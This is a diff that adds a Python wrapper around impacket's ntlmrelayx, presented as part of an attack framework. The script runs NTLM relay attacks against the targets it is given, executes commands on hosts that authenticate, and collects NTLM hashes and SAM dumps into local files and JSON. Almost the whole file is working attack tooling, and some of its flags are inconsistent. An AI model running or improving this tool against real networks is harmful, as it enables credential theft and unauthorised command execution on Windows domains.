@@ -1,0 +1,322 @@
+#!/usr/bin/env python3
+"""
+NTLM Relay Attack Wrapper for Bismillah Framework
+
+This is a wrapper around the impacket ntlmrelayx.py tool that automates
+NTLM relay attacks. It provides additional automation for:
+- Active Directory credential harvesting
+- Command execution on compromised hosts
+- SMB session persistence
+- Automatic lateral movement
+
+Dependencies:
+- impacket (pip install impacket)
+- ldap3
+- pyasn1
+
+Author: Bismillah Research Team
+Version: 1.5.0
+"""
+
+import os
+import sys
+import time
+import argparse
+import subprocess
+import threading
+import tempfile
+import json
+import logging
+import shlex
+import base64
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+logger = logging.getLogger("ntlmrelayx_wrapper")
+
+# Check for impacket presence
+try:
+    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    logger.warning("Impacket not found. Installing required dependencies...")
+    IMPACKET_AVAILABLE = False
+
+# Default configuration
+CONFIG = {
+    "targets": [],
+    "listen_addr": "0.0.0.0",
+    "listen_port": 445,
+    "relay_targets": [],
+    "command": "whoami /all",
+    "save_hashes": True,
+    "save_sam": True,
+    "interactive": False,
+    "ssl": False,
+    "no_smb": False,
+    "no_http": False,
+    "no_wcf": True,
+    "no_raw": True
+}
+
+HASHES_FILE = os.path.expanduser("~/ntlm_hashes.txt")
+SAM_DUMP_DIR = os.path.expanduser("~/sam_dumps/")
+
+def ensure_directories():
+    """Ensure necessary directories exist"""
+    if not os.path.exists(SAM_DUMP_DIR):
+        os.makedirs(SAM_DUMP_DIR)
+
+def install_dependencies():
+    """Install required dependencies if not present"""
+    logger.info("Installing impacket and dependencies...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", 
+                              "impacket", "ldap3", "pyasn1", "cryptography>=2.6"])
+        logger.info("Dependencies installed successfully!")
+        # Reload modules
+        global IMPACKET_AVAILABLE
+        from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+        from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
+        IMPACKET_AVAILABLE = True
+        return True
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Failed to install dependencies: {e}")
+        return False
+
+def build_command_line(config):
+    """Build ntlmrelayx command line from configuration"""
+    cmd = ["ntlmrelayx.py"]
+    
+    # Basic options
+    if config["listen_addr"]:
+        cmd.extend(["-i", config["listen_addr"]])
+    
+    if config["listen_port"] and config["listen_port"] != 445:
+        cmd.extend(["-p", str(config["listen_port"])])
+        
+    # Protocol options
+    if config["no_smb"]:
+        cmd.append("--no-smb")
+    if config["no_http"]:
+        cmd.append("--no-http")
+    if config["no_wcf"]:
+        cmd.append("--no-wcf")
+    if config["no_raw"]:
+        cmd.append("--no-raw")
+    
+    # Target options
+    if config["relay_targets"]:
+        for target in config["relay_targets"]:
+            cmd.extend(["-t", target])
+    
+    # Command execution
+    if config["command"]:
+        cmd.extend(["-c", config["command"]])
+    
+    # Misc options
+    if config["interactive"]:
+        cmd.append("-i")
+    if config["ssl"]:
+        cmd.append("-s")
+    if config["save_sam"]:
+        cmd.append("--dump-laps")
+        cmd.append("--dump-gmsa")
+        
+    # Output options
+    cmd.extend(["-of", HASHES_FILE])
+    
+    return cmd
+
+def parse_ntlm_hashes(file_path):
+    """Parse NTLM hashes from file"""
+    hashes = []
+    if not os.path.exists(file_path):
+        return hashes
+        
+    try:
+        with open(file_path, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if ':' in line:
+                    parts = line.split(':')
+                    if len(parts) >= 4:
+                        domain = parts[0]
+                        username = parts[1]
+                        lm_hash = parts[2]
+                        nt_hash = parts[3]
+                        hashes.append({
+                            "domain": domain,
+                            "username": username, 
+                            "lm_hash": lm_hash,
+                            "nt_hash": nt_hash
+                        })
+        return hashes
+    except Exception as e:
+        logger.error(f"Error parsing hashes file: {e}")
+        return hashes
+
+def run_ntlmrelayx(config, timeout=None):
+    """Run ntlmrelayx with the provided configuration"""
+    if not IMPACKET_AVAILABLE:
+        if not install_dependencies():
+            logger.error("Cannot run without required dependencies")
+            return False
+    
+    cmd = build_command_line(config)
+    cmd_str = " ".join([shlex.quote(c) for c in cmd])
+    logger.info(f"Running: {cmd_str}")
+    
+    try:
+        proc = subprocess.Popen(
+            cmd, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, 
+            universal_newlines=True
+        )
+        
+        # Monitor in separate thread if timeout provided
+        if timeout:
+            def monitor():
+                time.sleep(timeout)
+                if proc.poll() is None:
+                    logger.info(f"Timeout reached ({timeout}s). Terminating ntlmrelayx.")
+                    proc.terminate()
+                    
+            thread = threading.Thread(target=monitor)
+            thread.daemon = True
+            thread.start()
+        
+        # Process output
+        for line in proc.stdout:
+            line = line.strip()
+            if line:
+                logger.info(line)
+                
+                # Look for success indicators
+                if "SMBD-Thread" in line and "authenticated successfully" in line:
+                    logger.info("[+] Authentication successful!")
+                elif "Executed specified command" in line:
+                    logger.info("[+] Command executed successfully")
+                    
+        # Process eventually terminated
+        proc.wait()
+        
+        if proc.returncode != 0:
+            stderr = proc.stderr.read()
+            logger.error(f"ntlmrelayx exited with code {proc.returncode}: {stderr}")
+            return False
+            
+        logger.info("ntlmrelayx completed successfully")
+        return True
+        
+    except Exception as e:
+        logger.error(f"Error running ntlmrelayx: {e}")
+        return False
+
+def collect_credentials():
+    """Collect and return credentials from the attack"""
+    creds = {
+        "hashes": [],
+        "sam_dumps": []
+    }
+    
+    # Check for NTLM hashes
+    if os.path.exists(HASHES_FILE):
+        creds["hashes"] = parse_ntlm_hashes(HASHES_FILE)
+        logger.info(f"Collected {len(creds['hashes'])} NTLM hashes")
+    
+    # Check for SAM dumps
+    if os.path.exists(SAM_DUMP_DIR):
+        for file in os.listdir(SAM_DUMP_DIR):
+            if file.endswith(".sam"):
+                host = file.split(".")[0]
+                sam_path = os.path.join(SAM_DUMP_DIR, file)
+                try:
+                    with open(sam_path, 'rb') as f:
+                        sam_data = base64.b64encode(f.read()).decode('utf-8')
+                        creds["sam_dumps"].append({
+                            "host": host,
+                            "data": sam_data
+                        })
+                except Exception as e:
+                    logger.error(f"Error reading SAM dump {sam_path}: {e}")
+    
+    return creds
+
+def main():
+    """Main function"""
+    parser = argparse.ArgumentParser(description="NTLM Relay Attack Tool")
+    parser.add_argument("-t", "--target", action="append", dest="targets", 
+                        help="Target(s) to relay to (ip or host:port)")
+    parser.add_argument("-i", "--interface", dest="interface", default="0.0.0.0",
+                        help="Interface to listen on")
+    parser.add_argument("-p", "--port", dest="port", type=int, default=445,
+                        help="Port to listen on")
+    parser.add_argument("-c", "--command", dest="command", default="whoami /all",
+                        help="Command to execute on target (default: whoami /all)")
+    parser.add_argument("--interactive", action="store_true",
+                        help="Interactive mode")
+    parser.add_argument("-s", "--ssl", action="store_true",
+                        help="Use SSL/TLS")
+    parser.add_argument("--no-smb", action="store_true",
+                        help="Disable SMB protocol")
+    parser.add_argument("--no-http", action="store_true",
+                        help="Disable HTTP protocol")
+    parser.add_argument("--timeout", type=int,
+                        help="Timeout in seconds for attack duration")
+    parser.add_argument("--output-json", dest="output_json",
+                        help="Output results to JSON file")
+    
+    args = parser.parse_args()
+    
+    # Setup
+    ensure_directories()
+    
+    # Update configuration from args
+    if args.targets:
+        CONFIG["relay_targets"] = args.targets
+    if args.interface:
+        CONFIG["listen_addr"] = args.interface
+    if args.port:
+        CONFIG["listen_port"] = args.port
+    if args.command:
+        CONFIG["command"] = args.command
+    if args.interactive:
+        CONFIG["interactive"] = True
+    if args.ssl:
+        CONFIG["ssl"] = True
+    if args.no_smb:
+        CONFIG["no_smb"] = True
+    if args.no_http:
+        CONFIG["no_http"] = True
+    
+    # Check configuration
+    if not CONFIG["relay_targets"]:
+        logger.error("No targets specified. Use -t to specify targets.")
+        parser.print_help()
+        return 1
+    
+    # Run attack
+    logger.info("Starting NTLM relay attack...")
+    success = run_ntlmrelayx(CONFIG, timeout=args.timeout)
+    
+    # Collect results
+    if success:
+        credentials = collect_credentials()
+        logger.info(f"Attack completed. Collected {len(credentials['hashes'])} hashes and {len(credentials['sam_dumps'])} SAM dumps")
+        
+        # Save results to JSON if requested
+        if args.output_json:
+            try:
+                with open(args.output_json, 'w') as f:
+                    json.dump(credentials, f, indent=2)
+                logger.info(f"Results saved to {args.output_json}")
+            except Exception as e:
+                logger.error(f"Error saving results to JSON: {e}")
+    
+    return 0 if success else 1
+
+if __name__ == "__main__":
+    sys.exit(main())
